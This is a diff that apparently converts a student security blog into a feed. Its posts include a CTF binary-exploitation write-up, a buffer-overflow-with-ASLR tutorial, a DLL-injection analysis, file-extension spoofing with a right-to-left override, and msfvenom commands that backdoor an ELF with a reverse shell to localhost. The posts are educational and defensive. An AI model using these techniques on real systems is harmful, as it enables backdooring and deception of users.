 <p>Looks like the executable is a pretty standard pwnable. It’s a setuid binary where the objective is to call setuid and then spawn a shell so you can cat the flag.</p>
 
 <p>I decided that it would be easier to work with the executable locally so I scp-ed it onto my own hardware.</p>
 
-<p><img class="center" src="/images/tiny-easy/file.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/file.png"></p>
 
 <p>I started the analysis by running file on the executable. This actually yielded two important pieces of information. First, the executable is statically linked. Second, the executable has a corrupted section header size. Both of these will come into play later during exploitation.</p>
 
-<p><img class="center" src="/images/tiny-easy/objdump.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/objdump.png"></p>
 
 <p>This is where analyzing the executable starts to become more difficult. Running objdump on the executable didn’t dump any instructions! I am not entirely sure why this happened. My best guess is that since the executable didn’t contain a section header table, objdump just gave up on doing any disassembly.</p>
 
 <p>So it was time to be creative! I decided that the easiest way to get to the instructions would be to load executable into gdb and place a breakpoint on the executable’s entry point. I was able to get that entry point using readelf, which does a pretty reliable job of parsing through the elf header.</p>
 
-<p><img class="center" src="/images/tiny-easy/readelf.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/readelf.png"></p>
 
 <p>Some other interesting information we get from readelf is the fact that the program header and the elf header compose (32+52) = 84 out of the 90 bytes in the program. This means that there are only 6 bytes worth of executable instructions in the file.</p>
 
-<p><img class="center" src="/images/tiny-easy/break-on-entry.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/break-on-entry.png"></p>
 
 <p>My gdb is slightly more colorful than the one most people are familiar with. Its actually gdb-peda you can check it out here: <a href="https://github.com/longld/peda">https://github.com/longld/peda</a> “Python Exploit Development Assistance for GDB” makes exploitation significantly easier.</p>
 
 <p>tiny_easy doesn’t even bother trying to create a stack frame. Instead it pops argc into eax, pops a char pointer (argv[0]) into edx, dereferences that pointer/stores its contents into edx, and then finally it calls edx. When we type c and tell the program to continue, it does exactly what we expect it to: segfault. Let’s take a look at the registers at the time of the crash.</p>
 
-<p><img class="center" src="/images/tiny-easy/content-of-edx.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/content-of-edx.png"></p>
 
 <p>Once again nothing surprising here. The program crashes at the first 4 ascii characters of argv[0]. After quite a bit of googling it turns out that the built in command exec in bash lets you modify the value of argv when executing.</p>
 
-<p><img class="center" src="/images/tiny-easy/exec.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/exec.png"></p>
 
 <p>By opening up the core dump in gdb we can see that we got it to crash to 0x42424242 W00t!</p>
 
-<p><img class="center" src="/images/tiny-easy/crash.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/crash.png"></p>
 
 <p>But we are not quite done yet. Actually we are far from done! Now that we control the value of eip where should we tell it to go?</p>
 
@@ -1049,55 +774,17 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 </span><span class='line'>What a tiny task :<span class="o">)</span> good job!
 </span></code></pre></td></tr></table></div></figure>
 
-</div>
+]]></content>
+  </entry>
   
-  
+  <entry>
+    <title type="html"><![CDATA[Writing Buffer Overflow Exploits With ASLR]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/"/>
+    <updated>2015-03-24T18:33:43-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr</id>
+    <content type="html"><![CDATA[<p>Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more interesting, I decided to challenge myself to write an exploit for the program that would work with ASLR enabled.</p>
 
-
-      <footer>
-      
-      - <a href="/blog/2015/09/02/a-tiny-easy-ctf-challenge/">A Tiny Easy CTF Challenge</a>
-      <time datetime="2015-09-02T11:40:10-04:00" pubdate><span class='month'>Sep</span> <span class='day'>02</span> <span class='year'>2015</span></time>
-      
-      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a></span>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/">Writing Buffer Overflow Exploits With ASLR</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-03-24T18:33:43-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more interesting, I decided to challenge myself to write an exploit for the program that would work with ASLR enabled.</p>
-
-<p><img class="center" src="/images/buffer-overflow-aslr/randomization-proc-sys-kernel.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/randomization-proc-sys-kernel.png"></p>
 
 <p>The vulnerable program I wrote is found below. It uses the deprecated gets function which does not limit the amount of data being copied into its buffer. To avoid having to deal with DEP I decided to compile the program with the flag “-z execstack”.</p>
 
@@ -1148,7 +835,7 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img class="center" src="/images/buffer-overflow-aslr/firstsegfault.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/firstsegfault.png"></p>
 
 <p>To get the offset to the saved instructional pointer I just fed the address to pattern-offset.rb</p>
 
@@ -1169,23 +856,23 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>To make sure this worked I wrote a one lined ruby command to make sure the program crashed to the address 0x42424242 (the ascii letter B) and then analyzed the core dump.</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/second-segfault.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/second-segfault.png"></p>
 
 <p>One technique for making the buffer overflow exploit position independent is to jump to a register rather than a hardcoded address on the stack. A good register for this is esp. This works because although the contents of the register esp will change, the opcode to jump to esp will not. This can be shown by running the program twice and printing the contents of the registers using gdb.</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/inforeg1.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/inforeg1.png"></p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/inforeg2.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/inforeg2.png"></p>
 
 <p>The next picture below just illustrates how esp in the second picture above points just after the value used for overflowing the stack. Perfect spot to store shellcode!</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/looking-at-esp.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/looking-at-esp.png"></p>
 
 <p>The next step is to find some location in the text segment that has the instruction jmp esp.  For most programs written in linux the position of the text segment does not change each time the program is executed even with ASLR enabled. The start address of the text segment is actually a hard coded value found in the elf header file. Great! A tool that can help us look for the opcodes is msfelfscan.</p>
 
 <p>After running the command I felt a little stumped. The program did not use the instruction jmp esp anywhere in the text segment! My solution to this problem was to try and find a register with a different address that could be manipulated. Looking back at the register values at the time of crash eax seemed to fit the bill perfectly! The value of eax at the time of the crash stored the starting address of the data being copied onto the stack from gets. I ran msfelfscan a second time but this time looking for calls or jumps to eax. Found it.</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/calleax.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/calleax.png"></p>
 
 <p>My solution for exploiting the program became the following:</p>
 
@@ -1198,7 +885,7 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>Since I don’t have the entire x86 instruction set memorized cough cough. I decided to write a short assembly program using nasm to get the opcode for jump esp. First I compiled the file with nasm using the flag –f elf. Then I linked the program using ld and ran the a.out file it generated using objdump.</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/objdump.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/objdump.png"></p>
 
 <p>The full exploit, written in ruby, is found below. To test if it worked I used shellcode that should print a simple “hello world!” message.</p>
 
@@ -1229,54 +916,16 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>And finally, pwnage.</p>
 
-<p><img class="center" src="/images/buffer-overflow-aslr/pwnage.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/buffer-overflow-aslr/pwnage.png"></p>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/">Writing Buffer Overflow Exploits With ASLR</a>
-      <time datetime="2015-03-24T18:33:43-04:00" pubdate><span class='month'>Mar</span> <span class='day'>24</span> <span class='year'>2015</span></time>
-      
-      <span class="categories">posted in <a class='category' href='/blog/categories/tutorials/'>tutorials</a></span>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/02/01/dll-injection-on-windows-xp/">Dll Injection on Windows XP</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-02-01T19:29:34-05:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Although sometimes it obvious when a computer’s integrity has been compromised by malware (addware, fakeAV, etc), other times it’s much less obvious. Some malware samples, like those designed to exfiltrate creditcard information/ user logins, can have their largest impact when the user doesn’t know they’ve been infected.</p>
+  <entry>
+    <title type="html"><![CDATA[Dll Injection on Windows XP]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/02/01/dll-injection-on-windows-xp/"/>
+    <updated>2015-02-01T19:29:34-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/02/01/dll-injection-on-windows-xp</id>
+    <content type="html"><![CDATA[<p>Although sometimes it obvious when a computer’s integrity has been compromised by malware (addware, fakeAV, etc), other times it’s much less obvious. Some malware samples, like those designed to exfiltrate creditcard information/ user logins, can have their largest impact when the user doesn’t know they’ve been infected.</p>
 
 <p>To avoid detection malware will often rename itself to something harmless. One of the most recent malware sample I’ve analyzed, a sample from the Alina family of viruses, tried to rename its self winfax12.exe to try and avoid detection on point of sale machines.</p>
 
@@ -1301,7 +950,7 @@ Although there are variations on the process, malware will often take the follow
 
 <p>For those new to translating programs in IDA from assembly to C, one of the hardest parts can be getting used to the fact the arguments are pushed onto the stack in reverse order.</p>
 
-<p><img class="center" src="/images/windows-dll-injection-resources/VirtualAlloc.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/windows-dll-injection-resources/VirtualAlloc.png"></p>
 
 <p>In the picture above the function VirtualAllocEx is used to allocate enough memory into the running process so later the name of the dll to inject has a place to be written to. According to Microsoft’s documentation the prototype for VirtualAllocEX looks like the following:</p>
 
@@ -1349,55 +998,17 @@ Although using the CreateRemoteThread method works fantastic in windows XP the m
 
 
 
-</div>
+]]></content>
+  </entry>
   
-  
+  <entry>
+    <title type="html"><![CDATA[Spoofing File Extensions]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/01/15/spoofing-file-extensions/"/>
+    <updated>2015-01-15T13:06:02-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/01/15/spoofing-file-extensions</id>
+    <content type="html"><![CDATA[<p>After running a few malware samples in a virtual machine, it becomes obvious that malware developers thrive on social engineering. Why bother waiting for a zero day when you can just attack human error? Here are a few social engineering attempts I’ve seen so far:</p>
 
-
-      <footer>
-      
-      - <a href="/blog/2015/02/01/dll-injection-on-windows-xp/">Dll Injection on Windows XP</a>
-      <time datetime="2015-02-01T19:29:34-05:00" pubdate><span class='month'>Feb</span> <span class='day'>01</span> <span class='year'>2015</span></time>
-      
-      <span class="categories">posted in <a class='category' href='/blog/categories/malware/'>malware</a></span>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/01/15/spoofing-file-extensions/">Spoofing File Extensions</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-01-15T13:06:02-05:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>After running a few malware samples in a virtual machine, it becomes obvious that malware developers thrive on social engineering. Why bother waiting for a zero day when you can just attack human error? Here are a few social engineering attempts I’ve seen so far:</p>
-
-<p><img class="center" src="/images/spoofing-file-ext-resources/fakefiletypes.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/spoofing-file-ext-resources/fakefiletypes.png"></p>
 
 <p>I would say the most common “spoofed” file type is probably a pdf. So it’s a good idea to think twice before visiting a dodgy site to save money on textbooks.</p>
 
@@ -1409,64 +1020,28 @@ Although using the CreateRemoteThread method works fantastic in windows XP the m
 
 <p>The trick is pretty simple for a malware developer to deploy. Just open up All Programs-Accessories-System tools-Character Map then copy the character and paste it into the file name after right clicking.</p>
 
-<p><img class="center" src="/images/spoofing-file-ext-resources/Righttoleftoverride.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/spoofing-file-ext-resources/Righttoleftoverride.png"></p>
 
 <p>In the picture bellow the file was originally named “TextFilfdp.exe” After inserting the Unicode character after the letter “L” the file name appears as “TextFilexe.pdf”</p>
 
-<p><img class="center" src="/images/spoofing-file-ext-resources/NotAPDF.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/spoofing-file-ext-resources/NotAPDF.png"></p>
 
 <p>When double clicked, the file produced the ouput below. For a malware developer though, it would make sense to have the exe launch a real pdf viewer as a sub process. Then, while it’s open, have the malware inject itself into the real pdf viewer using dll injection quietly.</p>
 
-<p><img class="center" src="/images/spoofing-file-ext-resources/woops.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/spoofing-file-ext-resources/woops.png"></p>
 
 <p>On windows, I recommend right clicking on the file and viewing its properties to verify its file type before double clicking.</p>
 
-<p><img class="center" src="/images/spoofing-file-ext-resources/properties.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/spoofing-file-ext-resources/properties.png"></p>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/01/15/spoofing-file-extensions/">Spoofing File Extensions</a>
-      <time datetime="2015-01-15T13:06:02-05:00" pubdate><span class='month'>Jan</span> <span class='day'>15</span> <span class='year'>2015</span></time>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/12/31/writing-a-linux-executable-using-only-echo/">Writing a Linux Executable Using Only Echo</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2014-12-31T12:51:33-05:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>This Monday I decided to write a linux executable (elf) without using a compiler! I’ve always been a huge fan of low level programming exercises so this came pretty naturally. There was hardly any information on how to do this online so it took some real software engineering to get it to work. It would be pretty tedious to explain every line of bytes in this article but I put everything into a well commented bash script here: <a href="https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch">https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch</a></p>
+  <entry>
+    <title type="html"><![CDATA[Writing a Linux Executable Using Only Echo]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/12/31/writing-a-linux-executable-using-only-echo/"/>
+    <updated>2014-12-31T12:51:33-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/12/31/writing-a-linux-executable-using-only-echo</id>
+    <content type="html"><![CDATA[<p>This Monday I decided to write a linux executable (elf) without using a compiler! I’ve always been a huge fan of low level programming exercises so this came pretty naturally. There was hardly any information on how to do this online so it took some real software engineering to get it to work. It would be pretty tedious to explain every line of bytes in this article but I put everything into a well commented bash script here: <a href="https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch">https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch</a></p>
 
 <p>I used four tools to actually put things together, vim for writing a bash script to document what I was doing, echo to actually get the bytes I need, reaelf to make sure the elf file was being interpreted correctly, and ht editor as a simple hex editor and to view more information about the executable. I had to use a few extra flags on echo to make sure things were being interpreted correctly “-n” to prevent a newline from being appended, and “-e” to make sure bytes like “\x90” were actually being interpreted as bytes and not 4 ascii characters.</p>
 
@@ -1607,92 +1182,220 @@ Although using the CreateRemoteThread method works fantastic in windows XP the m
 <p>One odd thing you may notice about the assembly is the 4 pushes and later mov esp, ecx. What was effectively doing was placing the string “hello world!” onto the stack and then moving a pointer to this string into the register ecx. The system call that that the assembly makes is a call to write. This is done by moving the value 0x4 into the register eax and then making a call to int 0x80. The second function call happens just after this by moving the value 0x1 into eax and then making a call to int 0x80. This was just a function call to exit so the program quit cleanly.</p>
 
 <p>Wrapping things up, I was really proud of the fact I got this to work. Sometimes with developments such as object oriented programming and interpreted languages like java, it can get real easy to become so caught up in abstraction you completely forget your just dealing with a simple state machine.</p>
-</div>
+]]></content>
+  </entry>
   
+  <entry>
+    <title type="html"><![CDATA[TV 20 Interview]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/12/27/tv-20-interview/"/>
+    <updated>2014-12-27T12:27:58-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/12/27/tv-20-interview</id>
+    <content type="html"><![CDATA[<p>Now that finals are over its time to update the website with all the things! I forgot to write about it earlier but on November 21st I had the oppurtunity to do an interview with TV-20 correspondent Emily Burris on <strong>The Dangers of Public Wifi</strong></p>
+
+<p>The segement came together extremely well! You can watch the entire interview here: <a href="http://www.wcjb.com/morning-edition-technology-local-news/2014/11/dangers-free-wifi-your-personal-information-risk">http://www.wcjb.com/morning-edition-technology-local-news/2014/11/dangers-free-wifi-your-personal-information-risk</a></p>
+
+<p>I decided to prepare three demos since I thought they would work well for the segment.</p>
+
+<ol>
+<li><p><strong>Man in the middle attack:</strong> for this demo I setup ssl-strip and used arpspoof from kali to illistrate a simple arp-spoofing attack. I actually had a little bit of trouble with this one since the old windows xp virtualmachine I was using refused to connect to pages that normally used https. The porblem had to do with the recent poodle downgrade attack. Facebook dropped support for IE6 so the solution was to just update the browser</p></li>
+<li><p><strong>Vulnerable Services:</strong> for this demo I just disabled windows firewall on my XP box, fired up metasploit, and exploited ms08_067 everything went smoothly here. I used a meterpreter shell as the payload.</p></li>
+<li><p><strong>Rogue wifi access point:</strong> This one was acutally pretty new to me since it wasn&rsquo;t something I&rsquo;ve tried before. I used airbase-ng and set the SSID of the wifi accesspoint to (Evil Wireless)</p></li>
+</ol>
+
+]]></content>
+  </entry>
   
+  <entry>
+    <title type="html"><![CDATA[Lets Play with Visual Studio: Hashmap]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/11/13/lets-play-with-visual-studio-hashmap/"/>
+    <updated>2014-11-13T23:45:00-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/11/13/lets-play-with-visual-studio-hashmap</id>
+    <content type="html"><![CDATA[<p>This weekend I decided to take the time to play with Microsoft Visual Studio. As a UF student I was able to download Microsoft Visual Studio Professional 2013 for free from onthehub.com, Microsoft&rsquo;s Dream Spark portal. As a person who usually does most of their programming from command line Linux (vim + gcc) it was both convenient/a bit clunky working in an IDE.</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/hashmap-resources/installing-visual-studio.png"></p>
+
+<p>Programming in Visual studio reminded me a lot of java programming in eclipse. While java is something that eclipse did well the c++ development environment wasn&rsquo;t something to die for. This is something Visual Studio does well.</p>
+
+<p>As my first project I decided to write a simple implementation of the hashmap data structure I don&rsquo;t really have plans for using it in a future project but it was a good exercise. As most people know, the idea behind a hashmap is to map a value to a place in memory based off of a key. In my implementation the key is a string and the value is a void pointer. I used a void pointer because I wanted the structure to be as generic as possible.</p>
+
+<pre><code>Source code: https://github.com/quantumvm/c-hashmap
+</code></pre>
+
+<p>By including the header file, you can interact with a hashmap using three different functions:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">hash_map</span> <span class="o">*</span> <span class="nf">hashmap_create</span><span class="p">(</span><span class="kt">int</span> <span class="n">num_buckets</span><span class="p">);</span>
+</span><span class='line'><span class="kt">void</span> <span class="nf">hashmap_put</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">value</span><span class="p">,</span> <span class="n">hash_map</span> <span class="o">*</span> <span class="n">hashmap</span><span class="p">);</span>
+</span><span class='line'><span class="kt">void</span> <span class="o">*</span> <span class="nf">hashmap_get</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="n">hash_map</span> <span class="o">*</span> <span class="n">hashmap</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-      <footer>
-      
-      - <a href="/blog/2014/12/31/writing-a-linux-executable-using-only-echo/">Writing a Linux Executable Using Only Echo</a>
-      <time datetime="2014-12-31T12:51:33-05:00" pubdate><span class='month'>Dec</span> <span class='day'>31</span> <span class='year'>2014</span></time>
-      
-      </footer>
-    </article>
+<!-- more -->
+
+
+<p></p>
+
+<p>The create function initializes the hashmap, the put function adds a value to the hashmap, and the get function retrieves a value from the hashmap. The header file also describes two new types, a hash_map type which is a struct describing the hashmap and a hash_map_bucket, the later of which was necessary for the implementation rather than for the programmer.</p>
+
+<p>A hashmap works on two pretty basic principles hashing and mapping. A hashing algorithm takes an input value and produces a unique uniform output. By taking the modulus of the hashmap we can map this unique hash map to a position in an array or bucket. This results in some pretty excellent O(1) time complexity.</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/hashmap-resources/hash-diagram.png"></p>
+
+<p>Although the majority of the time the hash look up succeeds, you do occasionally encounter a problem where two hashes will map to the same bucket. There are different ways to handle this but I decided the best way to take care of this would be to make the hash_map_bucket struct the basis for a singly linked list. If the initial look up fails, I can simply call a recursive function that tries to find the next hash_map_bucket in the struct. If this fails it is assumed that the key isn&rsquo;t actually in the hashmap and a nullpointer is returned.</p>
+
+<p>The problems I encountered when designing/testing the hashmap were rather minor. One issue was structs that had memory being allocated using malloc() were not necessarily being initialized to zero. This became an issue because when a pointer to a node was declared in the struct, there wasn&rsquo;t a grantee that it was a null pointer. Some of the functions I wrote like getNextAvailableBucket() relied on traversing nodes until a null pointer was encountered. The solution to this problem was to use the function calloc() instead which turned out to have more relevant syntax and by default zeroed out the memory.</p>
+
+<p>The other problems I encountered had more to do with the transition from gcc to visual studio&rsquo;s compiler. Personally I had never used a precompiled header before so using:
+    #include &ldquo;stdafx.h&rdquo;
+Was rather new to me. One solution was to just start an empty project but I decided to work with the precompiled header anyway.</p>
+]]></content>
+  </entry>
   
-  <div class="pagination">
-    
-      <a class="prev" href="2">&larr; Older</a>
-    
-    <a href="/archives">Blog Archives</a>
-    
-  </div><!-- /div.pagination -->
-</div><!-- /div.blog-index -->
+  <entry>
+    <title type="html"><![CDATA[Improving Msfvenom Part--1]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project/"/>
+    <updated>2014-10-28T01:55:16-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project</id>
+    <content type="html"><![CDATA[<p>This is  a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/analysis of how msfvenom currently backdoors ELF files. This is all in an effort to add the “-k” functionality to ELF executables, the windows equivalent of an exe.</p>
 
-      </div><!-- /div#content -->
-    </div><!-- /div#main -->
-  </div><!-- /div.container -->
-  <footer><div id="footer-widgets-wrapper">
-  <div id="footer-first" class="footer-widget">
-    <h3>About Me</h3>
-    <p>Hacker, programmer, tinkerer want to do all the things.</p>
-    <section class="about-me">
-      
-      <div>
-        <ul>
-          
-            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
-          
-          
-            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
-          
-            <li>Blog: <a href="http://sheepshellcode.com">http://sheepshellcode.com</a></li>
-        </ul>
-      </div>
-    </section>
-  </div><!-- /div#footer-second -->
+<p>The -k flag is used by msfvenom to start a new thread for a payload that has been backdoored in an executable. This allows an attacker to preserve the original functionality of an executable while still executing the generated shellcode. This can come in quite handing for evading anti-virus. Unfortunately this feature is only available on 32-bit windows executables and msfvenom won&rsquo;t throw an error when you use this flag on a wrong file format.</p>
 
-  <div id="footer-second" class="footer-widget">
-    <h3>Involvement</h3>
-	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
-	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>
+<p>Currently when you run the following two commands they will produce an identical executable that does not have the functionality of the &ldquo;-k&rdquo; flag.</p>
 
-	Take a look:
-	 
-	<a href="http://www.ufsit.org">www.ufsit.org</a> 
-	
-  </div><!-- /div#footer-second -->
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f elf -x a.out &gt; backdooredNoK
+</span><span class='line'>
+</span><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f elf -k -x a.out &gt; backdoored
+</span></code></pre></td></tr></table></div></figure>
 
-  <div id="footer-third" class="footer-widget">
-    <h3>Academics</h3>
-	<img src="/images/profile.jpg" height=122 width=140 />
-  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
-	<p>B.S. Expected May 2016</p>
-  </div><!-- /div#footer-third -->
-</div><!-- /div#footer-widgets-wrapper -->
 
-<div id="credit" role="contentinfo">
-  <p>
-    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
-    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
-  </p>
-</div>
+<p>This can be verified by performing an md5 hash of the two executables.</p>
 
-</footer>
+<p><img class="center" src="http://sheepshellcode.com/images/msfvenom-part-1-resources/md5.png"></p>
+
+<p>To figure out what MsfVenom is actually doing, the executable can be loaded into IDA disassembler for static analysis. Before the program is backdoored, the program entry point (_start) looks like this:</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/msfvenom-part-1-resources/normalstart.png"></p>
+
+<p>After being backdoored the program entry point (_start) looks like this:</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/msfvenom-part-1-resources/backdooredstart.png"></p>
+
+<p>The original program entry point is simply overwritten with the shellcode. This can be verified by comparing the hex view in IDA of the (_start) function to the RAW output of shellcode that can be generated by MsfVenom.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f raw  &gt; RAW
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The hex dump from IDA looks like:</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/msfvenom-part-1-resources/Idahexdump.png"></p>
+
+<p>This is identical to the RAW shell code:</p>
+
+<p><img class="center" src="http://sheepshellcode.com/images/msfvenom-part-1-resources/rawshellcode.png"></p>
+
+<p>In order to make this projectmore manageable I&rsquo;ve broken it up into five chuncks each of which acts as its own milestone for tackling the problem.</p>
+
+<ol>
+<li>Reverse engineer Windows/Linux executables to determine how msfvenom is currently handling the &ldquo;-k&rdquo; option. (where is machine code stored, how is it triggered, is it loading libraries, etc)</li>
+<li>Using the gathered information, manually construct shellcode that will start in new thread for linux executable.</li>
+<li>Write script that automates the threading process of previous milestone</li>
+<li>Write script that embeds the new shellcode that starts in a thread into the elf executable.</li>
+<li>Interface this script with msfvenom&rsquo;s &ldquo;-k&rdquo; option</li>
+</ol>
+
+]]></content>
+  </entry>
   
+  <entry>
+    <title type="html"><![CDATA[Nmap on Android]]></title>
+    <link href="http://sheepshellcode.com/blog/2014/10/11/nmap-on-android/"/>
+    <updated>2014-10-11T20:00:56-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2014/10/11/nmap-on-android</id>
+    <content type="html"><![CDATA[<p>This weekend, I got my first smart phone an Android LGLS740. What I love about android is that it is a Linux based operating system at its core. The very first application I went to download on it was Terminal Emulator for Android (<a href="https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en">https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en</a>). This effectively makes the phone a low spec computer you can carry in your pocket.</p>
+
+<p>Although most of applications for android are written in java, It seemed logical that an ELF file should still be able to run so long as I compiled it for the right processor. I explored android&rsquo;s settings for cpu info but eventually gave up. I was a bit surprised I wasn&rsquo;t able to find this information under the &ldquo;Hardware information&rdquo; setting. I figured it would be much faster to just cat the cpuinfo file in the file system using the terminal app.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
